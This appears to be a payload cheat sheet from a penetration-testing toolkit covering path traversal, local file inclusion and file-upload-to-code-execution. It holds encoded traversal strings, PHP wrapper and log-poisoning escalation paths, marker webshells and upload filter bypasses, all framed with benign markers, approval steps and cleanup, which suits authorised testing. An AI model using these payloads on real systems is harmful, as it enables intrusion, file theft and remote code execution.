# Path traversal / LFI / upload payloads (shared by path-traversal-lfi / upload-rce)
# Benign marker reads for detection; sensitive reads + webshell upload are the variants (approval).

## Traversal detection (benign)
```
../../../../etc/hostname            # non-sensitive marker; prefer over /etc/passwd
..%2f..%2f..%2fetc/hostname         # URL-encoded
..%252f..%252f                      # double-encoded
....//....//                        # filter bypass (strip-once)
%2e%2e/                             # encoded dot
/var/www/....//....//etc/hostname   # absolute + traversal
```

## LFI escalation
```
php://filter/convert.base64-encode/resource=index.php      # read source (benign)
php://filter/.../resource=/etc/hostname
data:// , expect:// (if enabled) — exec wrappers (approval)
/proc/self/environ , access/error log poisoning -> LFI-to-RCE (approval, OOB proof)
```

## Upload → RCE
```
# benign webshell that only proves execution (echo a marker / call OOB) — NOT a real shell:
<?php echo "RS7F3Q"; ?>                         (.php / .phtml / .php5 / .pht)
<% out.print("RS7F3Q"); %>                      (.jsp)  ;  <%= "RS7F3Q" %> (.aspx)
# bypass type checks:
shell.php.jpg , shell.php%00.jpg , shell.pHp , magic bytes (GIF89a;) + .php,
Content-Type: image/png with php body, .htaccess to map an ext, path traversal in filename (../shell.php)
# SVG/XML upload -> XXE (hand to xxe-*); polyglot files
```

## Confirmation
Traversal/LFI: the marker file's REAL content comes back. Upload-RCE: request the stored file and get
the marker `RS7F3Q` (execution), or an OOB callback from the webshell. Keep everything benign; clean up
uploaded files (cleanup.md).
